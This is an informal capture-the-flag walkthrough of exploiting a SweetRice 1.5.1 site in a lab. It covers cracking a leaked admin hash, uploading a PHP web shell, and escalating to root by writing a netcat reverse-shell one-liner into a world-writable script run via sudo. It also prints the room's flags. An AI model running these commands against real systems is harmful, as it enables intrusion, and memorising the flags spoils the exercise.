----> Welcome to SweetRice - Thank your for install SweetRice as your website management system.

In: http://10.10.211.32/content/inc/latest.txt

----> 1.5.1 

Something Version

So, adding above things:

Sweet rice version-1.5.1

$ searchsploit SweetRice

In: http://10.10.211.32/content/inc/mysql_backup/

----> mysql_bakup_20191129023059-1.5.1.sql

I viewed the sql file in: https://bfotool.com/sql-to-text

So that I can copy the sql content as paste as text in file.

then used: cat sql-content.txt | grep user/username/admin

NOTE: Though I came to know it can be opened via sublimetext text as well

-----> manager (admin was there in file)

-----> hashed pass : 42f749ade7f9e195bf475f37a44cafcb ---> At 1st I thought it was password, but with this Ifailed to login.

I used Crackstation: pass : Password123

I thought, I can use this pass to login via ssh, but I was wrong.

With this I can use it to login: http://10.10.211.32/content/as/

In: http://10.10.211.32/content/as/?type=media_center

I actually uploaded .php5 file.

Then we started netcat as listener

----> We then executed the file in website or by simply using: curl <address> 

WE then got a shell, used: python3 -c 'import pty;pty.spawn("/bin/bash")'
		     used: ctrl + Z
                     used: stty -echo raw
		     used: export TERM=xterm		
`
In /home/itguy ---> User.txt: THM{63e5bce9271952aad1113b6f1ac28a07}

Now: see: piv-escalate.png

" (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl "

So here, we have to execute this file

We can't expoit SUID as no scope id present.

$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

$ ls -l /etc/copy.sh        
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

----> Here, priv=7 for other users!!

used : echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.112.253 7777 >/tmp/f" > /etc/copy.sh

Got from pentestmonkey

Now: started another netcat listner

Now : sudo -l ---> $ sudo /usr/bin/perl /home/itguy/backup.pl 

NOw we got the root shell

root.txt ----->  THM{6637f41d0177b6f37cb20d775124699f}


Though many thing be done : "There might be multiple ways to get user access."


We will now use the exploit...
